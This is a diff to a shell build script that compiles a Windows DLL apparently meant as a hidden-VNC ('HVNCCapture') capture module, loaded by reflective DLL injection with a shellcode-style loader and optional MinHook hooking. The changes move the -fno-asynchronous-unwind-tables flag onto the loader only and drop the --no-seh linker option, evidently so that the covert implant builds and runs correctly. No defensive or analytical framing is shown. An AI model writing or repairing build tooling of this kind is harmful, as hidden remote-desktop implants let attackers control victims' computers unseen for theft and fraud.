@@ -188,7 +188,6 @@ CXXFLAGS="$CXXFLAGS -DHVNCCapture_EXPORTS -DWIN_X64"
 CXXFLAGS="$CXXFLAGS -DREFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR"
 CXXFLAGS="$CXXFLAGS -DREFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN"
 CXXFLAGS="$CXXFLAGS -fno-stack-protector"
-CXXFLAGS="$CXXFLAGS -fno-asynchronous-unwind-tables"
 CXXFLAGS="$CXXFLAGS -fno-exceptions -fno-rtti"
 CXXFLAGS="$CXXFLAGS -I$SRC_DIR"
 if [ -n "${MINHOOK_INC:-}" ]; then
@@ -196,19 +195,20 @@ if [ -n "${MINHOOK_INC:-}" ]; then
 fi
 
 # C flags for ReflectiveLoader (pure C, no C++)
-CFLAGS="-O2 -DWIN64 -D_WIN64 -DNDEBUG -D_WINDOWS -D_USRDLL"
-CFLAGS="$CFLAGS -DHVNCCapture_EXPORTS -DWIN_X64"
-CFLAGS="$CFLAGS -DREFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR"
-CFLAGS="$CFLAGS -DREFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN"
-CFLAGS="$CFLAGS -fno-stack-protector"
-CFLAGS="$CFLAGS -fno-asynchronous-unwind-tables"
-CFLAGS="$CFLAGS -I$SRC_DIR"
+# Keep -fno-asynchronous-unwind-tables only for the loader shellcode
+LOADER_CFLAGS="-O2 -DWIN64 -D_WIN64 -DNDEBUG -D_WINDOWS -D_USRDLL"
+LOADER_CFLAGS="$LOADER_CFLAGS -DHVNCCapture_EXPORTS -DWIN_X64"
+LOADER_CFLAGS="$LOADER_CFLAGS -DREFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR"
+LOADER_CFLAGS="$LOADER_CFLAGS -DREFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN"
+LOADER_CFLAGS="$LOADER_CFLAGS -fno-stack-protector"
+LOADER_CFLAGS="$LOADER_CFLAGS -fno-asynchronous-unwind-tables"
+LOADER_CFLAGS="$LOADER_CFLAGS -I$SRC_DIR"
 if [ -n "${MINHOOK_INC:-}" ]; then
-  CFLAGS="$CFLAGS $MINHOOK_INC"
+  LOADER_CFLAGS="$LOADER_CFLAGS $MINHOOK_INC"
 fi
 
 echo "Compiling ReflectiveLoader.c ..."
-"$CC" -c $CFLAGS -o "$SRC_DIR/ReflectiveLoader.o" "$SRC_DIR/ReflectiveLoader.c"
+"$CC" -c $LOADER_CFLAGS -o "$SRC_DIR/ReflectiveLoader.o" "$SRC_DIR/ReflectiveLoader.c"
 
 echo "Compiling ReflectiveDll.c (C++) ..."
 "$CXX" -c $CXXFLAGS -include "$SRC_DIR/seh_compat.h" -o "$SRC_DIR/ReflectiveDll.o" "$SRC_DIR/ReflectiveDll.c"
@@ -228,7 +228,6 @@ fi
 
 "$CXX" -shared -o "$OUT_DIR/$DLL_NAME" $LINK_OBJS $LINK_LIBS \
   -Wl,--entry,DllMain \
-  -Wl,--no-seh \
   -Wl,--disable-runtime-pseudo-reloc \
   -fno-stack-protector \
   -fno-exceptions -fno-rtti \
